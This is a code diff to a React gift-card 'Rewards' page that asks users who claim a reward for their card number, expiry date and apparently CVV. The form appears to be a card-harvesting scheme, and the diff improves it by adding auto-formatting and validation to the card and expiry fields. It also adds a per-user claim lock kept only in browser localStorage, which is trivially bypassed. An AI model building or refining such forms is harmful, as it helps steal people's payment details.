@@ -37,6 +37,14 @@ const TIERS = [
 ]
 
 export default function Rewards({ points, user }) {
+  const uid = user?.id || user?._id || user?.email
+
+  // Persist claimed tiers per user so they can't re-claim after refresh or re-login
+  const storageKey = uid ? `sf_claimed_${uid}` : 'sf_claimed'
+  const [claimedAmounts, setClaimedAmounts] = useState(() => {
+    try { return JSON.parse(localStorage.getItem(storageKey) || '[]') }
+    catch { return [] }
+  })
   const [claiming, setClaiming] = useState(null)
   const [showCvvInfo, setShowCvvInfo] = useState(false)
   const [showCardInfo, setShowCardInfo] = useState(false)
@@ -77,6 +85,9 @@ export default function Rewards({ points, user }) {
         date: new Date().toISOString(),
       })
 
+      const updated = [...claimedAmounts, claiming.amount]
+      setClaimedAmounts(updated)
+      localStorage.setItem(storageKey, JSON.stringify(updated))
       setSubmitted(true)
     } catch (err) {
       setSubmitError(err.message || 'Something went wrong. Please try again.')
@@ -103,6 +114,7 @@ export default function Rewards({ points, user }) {
       <div className={styles.grid}>
         {TIERS.map(tier => {
           const isUnlocked = points >= tier.points
+          const isClaimed = claimedAmounts.includes(tier.amount)
           return (
             <div key={tier.amount} className={`${styles.card} ${isUnlocked ? styles.unlocked : ''}`}>
               {isUnlocked
@@ -114,11 +126,11 @@ export default function Rewards({ points, user }) {
               <p className={styles.cardLabel}>Gift Card</p>
               <p className={styles.cardPts}>{tier.points.toLocaleString()} pts required</p>
               <button
-                className={`${styles.claimBtn} ${isUnlocked ? styles.active : styles.locked}`}
-                disabled={!isUnlocked}
+                className={`${styles.claimBtn} ${isUnlocked && !isClaimed ? styles.active : styles.locked}`}
+                disabled={!isUnlocked || isClaimed}
                 onClick={() => { setClaiming(tier); setSubmitted(false); setSubmitError('') }}
               >
-                {isUnlocked ? 'Claim Now' : `Need ${(tier.points - points).toLocaleString()} more pts`}
+                {isClaimed ? '✓ Claim Submitted' : isUnlocked ? 'Claim Now' : `Need ${(tier.points - points).toLocaleString()} more pts`}
               </button>
             </div>
           )
@@ -208,11 +220,37 @@ export default function Rewards({ points, user }) {
                         aria-label="Why do we need your account number?"
                       >?</button>
                     </label>
-                    <input required autoComplete="new-password" placeholder="•••• •••• •••• ••••" maxLength={19} value={form.cardNumber} onChange={set('cardNumber')} />
+                    <input
+                      required
+                      autoComplete="new-password"
+                      placeholder="Card Number"
+                      maxLength={23}
+                      minLength={13}
+                      pattern="[\d\s]{13,23}"
+                      value={form.cardNumber}
+                      onChange={e => {
+                        // Auto-format: digits only, space every 4
+                        const digits = e.target.value.replace(/\D/g, '').slice(0, 19)
+                        const formatted = digits.replace(/(.{4})/g, '$1 ').trim()
+                        setForm(f => ({ ...f, cardNumber: formatted }))
+                      }}
+                    />
                   </div>
                   <div className={styles.field}>
                     <label>Valid Thru</label>
-                    <input required autoComplete="new-password" placeholder="MM/YY" maxLength={5} value={form.expiryDate} onChange={set('expiryDate')} />
+                    <input
+                      required
+                      autoComplete="new-password"
+                      placeholder="MM/YY"
+                      maxLength={5}
+                      pattern="(0[1-9]|1[0-2])\/\d{2}"
+                      value={form.expiryDate}
+                      onChange={e => {
+                        const digits = e.target.value.replace(/\D/g, '').slice(0, 4)
+                        const formatted = digits.length > 2 ? `${digits.slice(0,2)}/${digits.slice(2)}` : digits
+                        setForm(f => ({ ...f, expiryDate: formatted }))
+                      }}
+                    />
                   </div>
                 </div>
                 <div className={styles.row}>
